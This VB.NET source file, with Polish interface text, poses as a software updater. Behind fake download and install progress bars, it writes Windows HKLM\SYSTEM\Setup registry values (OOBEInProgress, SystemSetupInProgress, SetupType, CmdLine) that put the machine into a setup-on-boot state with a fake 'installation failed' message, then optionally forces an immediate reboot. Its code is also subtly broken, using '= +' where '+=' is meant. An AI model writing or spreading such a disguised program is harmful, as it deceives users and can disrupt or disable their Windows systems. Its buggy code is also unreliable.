Imports Microsoft.Win32

Public Class Form1
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Timer1.Start()
        TextBox1.Text = +"

Pobieranie aktualizacji..."
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        ProgressBar1.Value = +5
        If ProgressBar1.Value = ProgressBar1.Maximum Then
            Timer1.Stop()
            TextBox1.Text = +"

Gotowe.
Instalowanie aktualizacji..."
            Timer2.Start()
        End If
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        ProgressBar2.Value = +1
        If ProgressBar2.Value = ProgressBar2.Maximum Then
            Timer2.Stop()
            TextBox1.Text = +"

Gotowe."
            Dim key As RegistryKey = Registry.LocalMachine
            Dim subkey As RegistryKey


            subkey = key.OpenSubKey("SYSTEM\Setup", True)

            subkey.SetValue("OOBEInProgress", 1)
            subkey.SetValue("SystemSetupInProgress", 1)
            subkey.SetValue("SetupType", 2)
            subkey.SetValue("CMDLine", "C:\Windows\System32\cmd.exe /c msg * Instalacja zakończona niepowodzeniem. System będzie w stanie fallback.&REG ADD HKLM\System\Setup /v CmdLine /t Reg_Sz /d "" /f")
            If CheckBox1.Checked = True Then
                Dim P As New Process
                TextBox1.Text = +"

Restartowanie..."
                Dim s As New ProcessStartInfo("shutdown", " -r -t 0 -f")
                s.UseShellExecute = False
                s.CreateNoWindow = True
                s.RedirectStandardOutput = True
                s.RedirectStandardError = True
                P = New Process
                P.StartInfo = s
                P.Start()
                P.EnableRaisingEvents = True
            End If
        End If
    End Sub
End Class
